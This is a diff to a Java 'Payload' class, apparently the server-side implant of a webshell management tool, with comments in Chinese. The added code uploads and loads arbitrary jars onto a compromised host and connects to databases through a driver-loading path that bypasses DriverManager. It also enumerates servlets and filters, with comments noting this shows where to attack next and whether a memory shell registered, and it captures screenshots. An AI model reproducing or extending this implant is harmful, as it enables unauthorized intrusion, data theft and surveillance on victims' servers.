@@ -11,6 +11,7 @@ import java.nio.channels.SelectionKey;
 import java.nio.channels.Selector;
 import java.nio.channels.SocketChannel;
 import java.sql.Connection;
+import java.sql.Driver;
 import java.sql.DriverManager;
 import java.sql.ResultSet;
 import java.sql.ResultSetMetaData;
@@ -121,7 +122,16 @@ public final class Payload implements java.lang.reflect.InvocationHandler {
             }
             if ("db".equals(op)) {
                 return db(arg(args, 0), arg(args, 1), arg(args, 2), arg(args, 3),
-                        arg(args, 4), arg(args, 5), arg(args, 6));
+                        arg(args, 4), arg(args, 5), arg(args, 6), arg(args, 7));
+            }
+            if ("servlets".equals(op)) {
+                return servletList();
+            }
+            if ("jarload".equals(op)) {
+                return jarLoad(arg(args, 0), arg(args, 1));
+            }
+            if ("shot".equals(op)) {
+                return screenshot();
             }
             return "ERROR:unknown op: " + op;
         } catch (Throwable t) {
@@ -580,7 +590,7 @@ public final class Payload implements java.lang.reflect.InvocationHandler {
      * Java 载体做不到），所以驱动缺失时直接回 ERROR 并给出可操作的建议。
      */
     private static String db(String type, String host, String port, String user, String pass,
-            String dbname, String sql) {
+            String dbname, String sql, String jar) {
         if (type == null || type.length() == 0) {
             type = "mysql";
         }
@@ -602,10 +612,48 @@ public final class Payload implements java.lang.reflect.InvocationHandler {
                 tried.append(drivers[i]);
             }
         }
+        // classpath 上没有，但给了 jar 路径（jarload 上传过的，或目标机上现成的驱动包）：
+        // 这种驱动不在容器 classpath 里，DriverManager.getConnection 认不到它——
+        // registerDriver 会按「调用者类加载器能不能看见驱动类」校验，跨 loader 一律拒绝。
+        // 所以这里绕过 DriverManager，直接拿 Driver 实例 connect。
+        Driver direct = null;
+        if (loaded == null && jar != null && jar.trim().length() > 0) {
+            String jarPath = jar.trim();
+            String reason = null;
+            try {
+                ClassLoader jarLdr = loaderFor(jarPath);
+                for (int i = 0; i < drivers.length && direct == null; i++) {
+                    try {
+                        Object inst = Class.forName(drivers[i], true, jarLdr).newInstance();
+                        if (inst instanceof Driver) {
+                            direct = (Driver) inst;
+                            loaded = drivers[i] + "@" + jarPath;
+                        }
+                    } catch (Throwable t) {
+                        // 记下原因再换下一个类名。最常见的不是「包不对」而是「包缺依赖」——
+                        // 例如 sqlite-jdbc 静态块里要用 slf4j，只回一句「没找到驱动」会让人
+                        // 以为文件传错了，实际要再补一个依赖包。
+                        String m = t.getMessage();
+                        reason = t.getClass().getSimpleName() + (m == null ? "" : ": " + m);
+                    }
+                }
+                if (direct == null) {
+                    return "ERROR:" + jarPath + " 里没找到 " + type + " 的驱动（试过 " + tried
+                            + "）" + (reason == null ? "" : "；最后一个错误：" + reason)
+                            + "。如果错误是 NoClassDefFoundError，说明包缺依赖，"
+                            + "把它依赖的 jar 也 jarload 上去，然后 jar 参数里用逗号分隔多个路径。";
+                }
+            } catch (Throwable t) {
+                String m = t.getMessage();
+                return "ERROR:加载 " + jarPath + " 失败：" + t.getClass().getSimpleName()
+                        + (m == null ? "" : ": " + m);
+            }
+        }
         if (loaded == null) {
             return "ERROR:目标 classpath 上没有 " + type + " 的 JDBC 驱动（试过 " + tried
                     + "）。脚本载体能连是因为驱动被塞进了 payload；Java 载体只能用目标已有的 jar——"
-                    + "可先用 jar_load 往容器加载驱动，或退回 exec 调数据库客户端。";
+                    + "先 jarload 上传驱动包（会回可用路径），再把路径填到 db 的 jar 参数；"
+                    + "或者直接用目标机上的驱动 jar 文件路径。";
         }
         Connection conn = null;
         Statement st = null;
@@ -617,8 +665,23 @@ public final class Payload implements java.lang.reflect.InvocationHandler {
             } catch (Throwable ignored) {
                 // 老驱动不实现，无碍
             }
-            conn = DriverManager.getConnection(jdbcURL(type, host, port, dbname),
-                    user == null ? "" : user, pass == null ? "" : pass);
+            String url = jdbcURL(type, host, port, dbname);
+            if (direct != null) {
+                java.util.Properties props = new java.util.Properties();
+                if (user != null) {
+                    props.setProperty("user", user);
+                }
+                if (pass != null) {
+                    props.setProperty("password", pass);
+                }
+                conn = direct.connect(url, props);
+                if (conn == null) {
+                    return "ERROR:驱动 " + loaded + " 不接受 " + url + "（acceptsURL=false，检查库类型/URL 格式）";
+                }
+            } else {
+                conn = DriverManager.getConnection(url,
+                        user == null ? "" : user, pass == null ? "" : pass);
+            }
             st = conn.createStatement();
             try {
                 st.setQueryTimeout(30);
@@ -817,6 +880,293 @@ public final class Payload implements java.lang.reflect.InvocationHandler {
                 + ((v >> 16) & 0xff) + "." + ((v >> 24) & 0xff);
     }
 
+    // ---------- Servlet / Filter 枚举（Servlet 3.0 标准 API，跨容器） ----------
+
+    /**
+     * 枚举 Servlet/Filter 注册与映射。
+     *
+     * <p>只用 Servlet 3.0 的 {@code getServletRegistrations/getFilterRegistrations}，
+     * 不碰容器内部类，所以 Tomcat/Jetty/Undertow 一套代码通用。拿到的类名/映射是
+     * 「下一步打哪」的关键：能直接看出有没有暴露的管理 Servlet、过滤器链顺序，
+     * 以及内存马插进去之后是否真的登记上了。
+     */
+    private static String servletList() {
+        StringBuilder sb = new StringBuilder("{\"context\":{\"path\":");
+        sb.append(json(sApp == null ? "" : str(safeCall(sApp, "getContextPath"))));
+        sb.append(",\"server\":").append(json(sApp == null ? "" : str(safeCall(sApp, "getServerInfo"))));
+        sb.append(",\"api\":").append(json(servletApi()));
+        sb.append(",\"available\":").append(sApp != null);
+        sb.append("},\"servlets\":");
+        sb.append(registrations(sApp == null ? null : safeCall(sApp, "getServletRegistrations"), false));
+        sb.append(",\"filters\":");
+        sb.append(registrations(sApp == null ? null : safeCall(sApp, "getFilterRegistrations"), true));
+        sb.append(",\"attributes\":").append(contextAttrs());
+        sb.append('}');
+        return sb.toString();
+    }
+
+    /** 把 Map&lt;String, ServletRegistration|FilterRegistration&gt; 摊平成数组。 */
+    private static String registrations(Object map, boolean filter) {
+        StringBuilder sb = new StringBuilder("[");
+        int n = 0;
+        if (map instanceof java.util.Map) {
+            java.util.Iterator it = ((java.util.Map) map).entrySet().iterator();
+            while (it.hasNext()) {
+                java.util.Map.Entry e = (java.util.Map.Entry) it.next();
+                Object reg = e.getValue();
+                if (n++ > 0) {
+                    sb.append(',');
+                }
+                sb.append("{\"name\":").append(json(str(e.getKey())));
+                sb.append(",\"class\":").append(json(str(safeCall(reg, "getClassName"))));
+                if (filter) {
+                    sb.append(",\"patterns\":").append(json(join(safeCall(reg, "getUrlPatterns"))));
+                    sb.append(",\"async\":").append(json(str(safeCall(reg, "getAsyncSupported"))));
+                } else {
+                    sb.append(",\"mappings\":").append(json(join(safeCall(reg, "getMappings"))));
+                    sb.append(",\"load_on_startup\":").append(json(str(safeCall(reg, "getLoadOnStartup"))));
+                }
+                sb.append('}');
+            }
+        }
+        return sb.append(']').toString();
+    }
+
+    /**
+     * ServletContext 属性名 + 值的类型名。
+     *
+     * <p>只给类型不给 toString：属性里常有连接池/数据源这类对象，toString 可能是半页
+     * 无关文本甚至敏感串；类型名足够判断「这里挂着什么，值不值得继续挖」。
+     */
+    private static String contextAttrs() {
+        StringBuilder sb = new StringBuilder("{");
+        Object names = sApp == null ? null : safeCall(sApp, "getAttributeNames");
+        int n = 0;
+        if (names instanceof java.util.Enumeration) {
+            java.util.Enumeration en = (java.util.Enumeration) names;
+            while (en.hasMoreElements() && n < 80) {
+                Object k = en.nextElement();
+                Object v = safeCall(sApp, "getAttribute", k);
+                if (n++ > 0) {
+                    sb.append(',');
+                }
+                sb.append(json(String.valueOf(k))).append(':')
+                        .append(json(v == null ? "null" : v.getClass().getName()));
+            }
+        }
+        return sb.append('}').toString();
+    }
+
+    // ---------- Jar 动态加载 ----------
+
+    // 装载器挂在 ServletContext 属性上而不是静态字段：载荷类每个请求都会被重新
+    // defineClass，上一次请求的静态字段活不到下一次。
+    private static final String JAR_ATTR_PREFIX = "forang.jar.";
+
+    /**
+     * 上传 jar 到目标机并装载，回报路径与其中的 JDBC 驱动。
+     *
+     * <p>用途是解决「目标有数据库但容器 classpath 里没有驱动」这个最常见的卡点：
+     * 传一个驱动包上来，再把返回的路径填进 db 的 jar 参数即可直连。
+     */
+    private static String jarLoad(String b64, String savePath) {
+        if (b64 == null || b64.trim().length() == 0) {
+            return "ERROR:缺少 jar 内容（base64）";
+        }
+        byte[] bytes;
+        try {
+            bytes = java.util.Base64.getDecoder().decode(b64.trim());
+        } catch (Throwable t) {
+            return "ERROR:base64 解码失败：" + str(t.getMessage());
+        }
+        File f;
+        try {
+            if (savePath != null && savePath.trim().length() > 0) {
+                f = new File(savePath.trim());
+                File parent = f.getParentFile();
+                if (parent != null && !parent.isDirectory()) {
+                    parent.mkdirs();
+                }
+            } else {
+                f = File.createTempFile("forang-", ".jar");
+            }
+            FileOutputStream fos = new FileOutputStream(f);
+            try {
+                fos.write(bytes);
+            } finally {
+                fos.close();
+            }
+        } catch (Throwable t) {
+            return "ERROR:写入 jar 失败：" + t.getClass().getSimpleName() + "：" + str(t.getMessage());
+        }
+
+        StringBuilder sb = new StringBuilder("{\"ok\":true");
+        sb.append(",\"path\":").append(json(f.getAbsolutePath()));
+        sb.append(",\"size\":").append(bytes.length);
+        try {
+            ClassLoader ucl = loaderFor(f.getAbsolutePath());
+            java.util.List names = jarEntries(f);
+            sb.append(",\"classes\":").append(names.size());
+            sb.append(",\"jdbc_drivers\":").append(json(join(jdbcDrivers(f, ucl, names))));
+            sb.append(",\"kept\":").append(sApp != null);
+        } catch (Throwable t) {
+            sb.append(",\"classes\":0,\"jdbc_drivers\":[],\"kept\":false");
+            sb.append(",\"error\":").append(json(t.getClass().getSimpleName() + "：" + str(t.getMessage())));
+        }
+        // 驱动清单要能让调用方直接照抄进 db 的 jar 参数，所以路径单独给一行可读文本
+        sb.append(",\"hint\":").append(json("把 path 填进 db 的 jar 参数即可用这个包里的驱动直连"));
+        return sb.append('}').toString();
+    }
+
+    /** 列 jar 里的 .class 条目（只列名，不加载，避免静态初始化块在探测阶段跑起来）。 */
+    private static java.util.List jarEntries(File f) throws IOException {
+        java.util.List names = new ArrayList();
+        java.util.jar.JarFile jf = new java.util.jar.JarFile(f);
+        try {
+            java.util.Enumeration entries = jf.entries();
+            while (entries.hasMoreElements() && names.size() < 2000) {
+                // 直接转 JarEntry：JarFile$JarFileEntry 是不可见的实现类，用反射调 getName
+                // 会被访问检查挡下（返回 null），表现为「jar 里一个 class 都数不出来」。
+                java.util.jar.JarEntry e = (java.util.jar.JarEntry) entries.nextElement();
+                if (e.getName().endsWith(".class")) {
+                    names.add(e.getName());
+                }
+            }
+        } finally {
+            jf.close();
+        }
+        return names;
+    }
+
+    /**
+     * 找出包里实现 java.sql.Driver 的类。
+     *
+     * <p>优先读 META-INF/services/java.sql.Driver（JDBC 4 的正式声明），没有再按类名
+     * 里带 Driver 的候选逐个验证——只靠命名会漏掉非标准命名的驱动，只靠服务文件则
+     * 漏掉老包。
+     */
+    private static java.util.List jdbcDrivers(File f, ClassLoader ucl, java.util.List entries) {
+        java.util.List out = new ArrayList();
+        java.util.List cand = new ArrayList();
+        try {
+            java.util.jar.JarFile jf = new java.util.jar.JarFile(f);
+            try {
+                java.util.jar.JarEntry e = jf.getJarEntry("META-INF/services/java.sql.Driver");
+                if (e != null) {
+                    InputStream in = jf.getInputStream(e);
+                    try {
+                        java.io.BufferedReader br = new java.io.BufferedReader(
+                                new java.io.InputStreamReader(in, "UTF-8"));
+                        String line;
+                        while ((line = br.readLine()) != null) {
+                            line = line.trim();
+                            if (line.length() > 0 && line.charAt(0) != '#') {
+                                cand.add(line);
+                            }
+                        }
+                    } finally {
+                        in.close();
+                    }
+                }
+            } finally {
+                jf.close();
+            }
+        } catch (Throwable ignored) {
+            // 没有服务文件就走下面的命名启发
+        }
+        if (cand.isEmpty()) {
+            for (int i = 0; i < entries.size(); i++) {
+                String nm = String.valueOf(entries.get(i));
+                int slash = nm.lastIndexOf('/');
+                String simple = slash >= 0 ? nm.substring(slash + 1) : nm;
+                if (simple.endsWith("Driver.class")) {
+                    cand.add(nm.substring(0, nm.length() - 6).replace('/', '.'));
+                }
+            }
+        }
+        for (int i = 0; i < cand.size() && out.size() < 20; i++) {
+            String cn = String.valueOf(cand.get(i));
+            try {
+                Class c = Class.forName(cn, false, ucl);
+                if (Driver.class.isAssignableFrom(c)) {
+                    out.add(cn);
+                }
+            } catch (Throwable ignored) {
+                // 依赖缺失的类跳过
+            }
+        }
+        return out;
+    }
+
+    /**
+     * 取（或新建）jar 的装载器，支持逗号/分号分隔的多个包。
+     *
+     * <p>多包是必需的：驱动包经常互相依赖（例如 sqlite-jdbc 需要 slf4j-api），
+     * 一个 URLClassLoader 里同时挂上主包和依赖包才能把驱动类初始化起来。
+     * 父加载器用载荷自己的，保证两边共用同一个 java.sql.Driver 接口。
+     */
+    private static ClassLoader loaderFor(String path) throws Exception {
+        String key = JAR_ATTR_PREFIX + path;
+        if (sApp != null) {
+            Object o = safeCall(sApp, "getAttribute", key);
+            if (o instanceof ClassLoader) {
+                return (ClassLoader) o;
+            }
+        }
+        String[] parts = path.split("[,;]");
+        java.util.List urls = new ArrayList();
+        for (int i = 0; i < parts.length; i++) {
+            String one = parts[i].trim();
+            if (one.length() == 0) {
+                continue;
+            }
+            File f = new File(one);
+            if (!f.isFile()) {
+                throw new java.io.FileNotFoundException("jar 不存在或不可读: " + one);
+            }
+            urls.add(f.toURI().toURL());
+        }
+        if (urls.isEmpty()) {
+            throw new java.io.FileNotFoundException("没有可加载的 jar: " + path);
+        }
+        ClassLoader ucl = new java.net.URLClassLoader(
+                (java.net.URL[]) urls.toArray(new java.net.URL[0]),
+                Payload.class.getClassLoader());
+        if (sApp != null) {
+            try {
+                call(sApp, "setAttribute", key, ucl);
+            } catch (Throwable ignored) {
+                // 存不下就每次重建，功能不受影响
+            }
+        }
+        return ucl;
+    }
+
+    // ---------- 远程屏幕 ----------
+
+    /**
+     * java.awt.Robot 截屏 → PNG base64。
+     *
+     * <p>服务器上基本是 headless（没有 X/桌面会话），先判 {@code isHeadless} 给一句
+     * 明确的「为什么不可用」，别让调用方以为是载荷坏了。
+     */
+    private static String screenshot() {
+        try {
+            if (java.awt.GraphicsEnvironment.isHeadless()) {
+                return "ERROR:目标 JVM 处于 headless 模式（无图形会话），截屏不可用。"
+                        + "服务器场景属正常；需要看页面内容就用 exec 抓取或用文件管理读日志。";
+            }
+            java.awt.Rectangle rect = new java.awt.Rectangle(
+                    java.awt.Toolkit.getDefaultToolkit().getScreenSize());
+            java.awt.image.BufferedImage img = new java.awt.Robot().createScreenCapture(rect);
+            ByteArrayOutputStream bos = new ByteArrayOutputStream();
+            javax.imageio.ImageIO.write(img, "png", bos);
+            return "IMG:" + java.util.Base64.getEncoder().encodeToString(bos.toByteArray());
+        } catch (Throwable t) {
+            return "ERROR:" + t.getClass().getSimpleName() + "：" + str(t.getMessage());
+        }
+    }
+
     // ---------- 插件用的低层工具（不依赖外部命令） ----------
 
     private static boolean isWS(char c) {
@@ -973,6 +1323,30 @@ public final class Payload implements java.lang.reflect.InvocationHandler {
             return pid != null && pid.equals(f);
         }
         return text != null && text.toLowerCase().indexOf(f) >= 0;
+    }
+
+    /** null 安全的字符串化：反射取值常是 null，直接拼会得到 "null"。 */
+    private static String str(Object o) {
+        return o == null ? "" : String.valueOf(o);
+    }
+
+    /** 集合摊平成逗号串（Servlet 的 mappings/patterns 都是 Collection）；非集合原样输出。 */
+    private static String join(Object o) {
+        if (o == null) {
+            return "";
+        }
+        if (o instanceof java.util.Collection) {
+            StringBuilder sb = new StringBuilder();
+            java.util.Iterator it = ((java.util.Collection) o).iterator();
+            while (it.hasNext()) {
+                if (sb.length() > 0) {
+                    sb.append(',');
+                }
+                sb.append(String.valueOf(it.next()));
+            }
+            return sb.toString();
+        }
+        return String.valueOf(o);
     }
 
     private static String clip(String s, int max) {
@@ -1758,9 +2132,18 @@ public final class Payload implements java.lang.reflect.InvocationHandler {
                 continue;
             }
             try {
-                m.setAccessible(true);
+                // 模块系统（JDK 9+）下 setAccessible 可能被拒（InaccessibleObjectException），
+                // 这时不该整条链断掉——很多容器实现类是不可见的非 public 类，但同名方法
+                // 往往在可见的父类/接口上也声明了，继续试下一个重载反而能成。
+                try {
+                    m.setAccessible(true);
+                } catch (Throwable ignored) {
+                    // 保持默认可见性继续试
+                }
                 return m.invoke(o, args);
             } catch (IllegalArgumentException e) {
+                last = e;
+            } catch (IllegalAccessException e) {
                 last = e;
             }
         }
